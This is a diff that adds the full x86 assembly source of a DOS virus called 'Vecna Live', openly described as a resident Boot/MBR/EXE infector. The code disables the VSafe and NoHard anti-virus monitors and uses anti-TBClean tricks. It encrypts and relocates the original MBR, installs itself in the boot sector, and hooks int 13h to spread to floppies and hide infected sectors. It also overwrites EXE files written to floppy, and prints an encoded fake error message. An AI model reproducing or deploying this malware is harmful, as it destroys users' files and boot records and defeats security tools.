@@ -1,0 +1,284 @@
+;  " Seldom is the name Vecna spoken, and even then only in the most hushed
+;    and terrified tones, for legends say the shade of this most supreme 
+;    of all liches still roams the world."
+;
+; [Vecna Live] by Vecna
+;
+; Resident Boot/MBR/EXE infector
+; Advanced Stealth
+; Encrypt Boot/MBR
+; Retro functions
+; Does other stuff
+
+.model  tiny
+.code
+org     0
+
+MARK = 'V ' XOR 05555h
+
+Start:  cli
+	jmp     short begin
+
+bootif: db      1fh dup (?)                             ; Old BPB
+
+begin:  cmp     cs:[0], 20cdh                           ; Check PSP
+	jnz     InBoot
+
+InCom:  sti                                             ; TBClean active?
+	push    word ptr [loco+100h]                    ; Debug active?
+	mov     byte ptr [loco+100h+1], 0h              ; Pentium?
+loco:   jmp     short conti                             ; No, continue
+	mov     si, offset Msg2+100h
+	mov     cx, EndMsg2-Msg2
+	mov     byte ptr[_ret+100h], 0c3h
+	xor     ax, ax
+	db      2eh
+	int     10h
+	call    Decrypt                                 ; Print warning
+twast:  loop    twast                                   ; Wast time
+
+conti:  pop     word ptr [loco+100h]                    ; Restore
+	mov     byte ptr[_ret+100h], 2eh
+	mov     ah, 0ffh                                ; Uninstall NoHard
+	xor     bl, bl
+	db      2eh                                     ; Anti-TBClean
+	int     13h
+	mov     ax, 0fa02h                              ; Uninstall VSafe
+	mov     dx, 5945h
+	int     16h
+	mov     ah, 019h                                ; Res check
+	int     13h
+	cmp     ah, 0f0h
+	je      GoOut
+	mov     ax, 0201h                               ; Read MBR
+	mov     bx, offset EndVir+100h
+	mov     cl, 01h
+	push    cx
+	mov     dx, 0080h
+	int     13h
+	cmp     word ptr es:[bx+offset marker],MARK     ; Is infected?
+	je      GoOut
+	call    EncDec                                  ; Encrypt MBR
+	mov     ax, 0301h
+	push    ax
+	mov     cl, 05h
+	int     13h                                     ; Write to sector 5
+	pop     ax
+	pop     cx
+	mov     bx, 0100h
+	int     13h                                     ; Write virus
+GoOut:  mov     si, offset Msg+100h
+	mov     cx, EndMsg-Msg                          ; Print fake msg
+
+Decrypt:lodsb
+	xor     al, 055h
+	db      2eh                                     ; Anti-TBClean
+	int     29h
+	loop    Decrypt
+	mov     ah, 4ch
+_ret:   db      2eh                                     ; Anti-TBClean
+	int     21h
+
+InBoot: mov     si,7c00h
+	xor     ax,ax
+	mov     es,ax
+	mov     cl,6
+	mov     ss,ax                                   ; Setup stack
+	mov     sp,si
+	sti
+	mov     ds,ax
+	dec     word ptr ds:[413h]                      ; Steal 1024 bytes
+	int     12h
+	shl     ax,cl
+	xor     di,di
+	mov     cx,100h
+	mov     es,ax
+	rep     movsw                                   ; Copy to high mem
+	mov     ax,word ptr ds:[13h*4]
+	mov     word ptr es:[offset i13],ax
+	mov     ax,word ptr ds:[13h*4+2]
+	mov     word ptr es:[offset i13+2],ax
+	mov     word ptr ds:[13h*4],offset handler     ; Hook int 13h
+	mov     word ptr ds:[13h*4+2],es
+	int     19h                                    ; Reboot
+
+Stealth:mov     cx,5                                   ; Show sector 5
+	mov     ax,201h
+	cmp     dl,80h
+	jae     st_hd
+	mov     cl,14                                  ; Or sector 14 head 1
+	mov     dh,1                                   ; in floppies
+st_hd:  call    int13h
+	call    EncDec                                 ; Decrypt
+	jmp     short pop_exit
+
+Handler:cmp     ah, 019h                               ; Res check?
+	je      ResTest
+	cmp     ah,2                                   ; Reading?
+	jb      OtherStealth
+	cmp     ah,3                                   ; Writing?
+	ja      OtherStealth
+	cmp     cx,1                                   ; In boot sector?
+	jne     OtherStealth
+	cmp     dh,0
+	jne     OtherStealth
+	call    int13h
+	jnc     GoInf                                  ; Try infect
+	jmp     a13h
+ResTest:mov     ah, 0f0h
+	iret
+
+GoInf:  pushf
+	push    ax
+	push    bx
+	push    cx
+	push    dx
+	push    si
+	push    di
+	push    es
+	push    ds
+	cmp     word ptr es:[bx + offset marker],MARK  ; Already infect
+	je      stealth
+	cmp     dl,80h
+	jb      inf_fl
+	mov     cx,5
+	xor     dh,dh
+	jmp     short write_v
+Inf_fl: mov     cl,14
+	mov     dh,1
+Write_V:call    EncDec
+	mov     ax,301h
+	call    int13h                                 ; Write encrypted Boot
+	call    EncDec
+	jc      pop_exit
+	push    es
+	pop     ds
+	push    cs
+	pop     es
+	mov     si, bx
+	add     si, 3
+	mov     di, offset bootif
+	mov     cx, 1fh
+	rep     movsb                                  ; Copy BPB
+	push    cs
+	push    cs
+	pop     es
+	pop     ds
+	xor     bx, bx
+	mov     ax,301h
+	mov     cx,1
+	xor     dh,dh
+	call    int13h
+
+Pop_Exit:pop     ds
+	pop     es
+	pop     di
+	pop     si
+	pop     dx
+	pop     cx
+	pop     bx
+	pop     ax
+	popf
+	retf    2
+
+OtherStealth:
+	cmp     cx,5                                   ; In sector 5?
+	jne     IsExe
+	cmp     dh,0                                   ; In head 0?
+	jne     IsExe
+	cmp     dl,80h                                 ; In hd?
+	jb      IsExe
+	mov     cx, 0bh                                ; To sector 11
+	jmp     short a13h
+
+IsExe:  cmp     ah, 03h
+	jne     a13h                                   ; Writing?
+	push    ax
+	mov     ax, word ptr es:[bx]
+	add     al, ah
+	cmp     al, 167                                ; EXE file?
+	pop     ax
+	jne     a13h
+	cmp     word ptr es:[bx+4], 080h               ; Big enough?
+	jbe     a13h
+	cmp     dl,80h                                 ; In floppy?
+	jae     a13h
+	push    ds
+	push    cx
+	push    di
+	push    si
+	push    cs
+	pop     ds
+	xor     si, si
+	mov     di, bx
+	mov     cx, 200h
+	rep     movsb                                  ; Overwrite with
+	pop     si                                     ; virus code
+	pop     di
+	pop     cx
+	pop     ds
+
+a13h:   db      0eah
+	i13     dd 0
+
+Int13h: pushf
+	call    dword ptr cs:[i13]
+	ret
+
+EncDec: push   bx                                       ; Encrypt/Decrypt boot
+	push   cx
+	mov    cx, 200h
+EncLoop:xor    byte ptr es:[bx], cl
+	inc    bx
+	loop   EncLoop
+	pop    cx
+	pop    bx
+	ret
+
+Msg     db      'O' XOR 055h                            ; Fake message
+	db      'u' XOR 055h
+	db      't' XOR 055h
+	db      ' ' XOR 055h
+	db      'o' XOR 055h
+	db      'f' XOR 055h
+	db      ' ' XOR 055h
+	db      'm' XOR 055h
+	db      'e' XOR 055h
+	db      'm' XOR 055h
+	db      'o' XOR 055h
+	db      'r' XOR 055h
+	db      'y' XOR 055h
+	db      '.' XOR 055h
+	db      10  XOR 055h
+	db      13  XOR 055h
+endmsg:
+
+Marker:
+
+msg2:   db      ' ' XOR 055h                            ; Warning...
+	db      'V' XOR 055h
+	db      'e' XOR 055h
+	db      'c' XOR 055h
+	db      'n' XOR 055h
+	db      'a' XOR 055h
+	db      ' ' XOR 055h
+	db      'L' XOR 055h
+	db      'i' XOR 055h
+	db      'v' XOR 055h
+	db      'e' XOR 055h
+	db      ' ' XOR 055h
+	db      '.' XOR 055h
+	db      '.' XOR 055h
+	db      '.' XOR 055h
+	db      10  XOR 055h
+	db      13  XOR 055h
+	db      07  XOR 055h
+endmsg2:
+
+org     510
+	db      055h,0aah                               ; Valid MBR
+
+EndVir:
+
+end
+
